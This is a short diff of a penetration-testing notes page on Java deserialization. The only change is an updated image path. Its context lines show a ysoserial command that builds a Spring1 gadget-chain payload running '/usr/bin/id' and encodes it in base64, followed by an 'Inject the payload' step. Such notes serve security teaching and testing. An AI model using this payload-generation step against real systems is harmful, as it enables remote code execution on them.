@@ -37,7 +37,7 @@ Find where the serialized object is used. A good indicator is the string rO0, wh
 java -jar ysoserial-master-6eca5bc740-1.jar  Spring1  "/usr/bin/id" | base64 -w 0
 ```
 
-![](<../../../../.gitbook/assets/image (15).png>)
+![](<../../../../.gitbook/assets/image (15) (1).png>)
 
 * Inject the payload
 
